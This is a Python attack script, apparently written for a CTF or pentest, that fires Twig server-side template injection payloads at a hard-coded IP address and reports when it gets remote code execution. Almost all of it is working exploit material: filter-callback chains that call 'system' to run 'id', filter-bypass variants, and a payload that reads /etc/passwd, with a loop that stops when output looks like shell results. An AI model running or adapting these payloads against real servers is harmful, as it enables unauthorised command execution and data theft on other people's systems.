import requests

url = 'http://51.159.16.22:8027/'

payloads = [
    # Détection de base
    '{{7*7}}',
    '{{{7*7}}}',
    '{{ 7*7 }}',
    
    # RCE méthode _self
    '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}',
    
    # RCE méthode filter
    "{{['id']|filter('system')}}",
    "{{['id',' ']|sort('system')}}",
    
    # RCE méthode map
    "{{'id'|map('system')}}",
    
    # RCE via app
    '{{app.request.server.get("HTTP_HOST")}}',
    
    # bypass filtre avec triple accolade
    '{{{_self.env.registerUndefinedFilterCallback("system")}}}{{{_self.env.getFilter("id")}}}',
    
    # bypass avec espaces
    '{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}',
    
    # Twig 2.x/3.x
    '{{"/etc/passwd"|file_get_contents}}',
    
    # Via setRawBlock
    '{% set cmd="id" %}{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter(cmd)}}',
]

for p in payloads:
    r = requests.get(url, params={'name': p})
    print(f'\n[PAYLOAD] {repr(p)}')
    print(f'[RESULT]  {r.text.strip()}')
    if any(x in r.text for x in ['uid=', 'root', '/bin', 'Linux']):
        print('🎯 RCE FOUND!')
        break
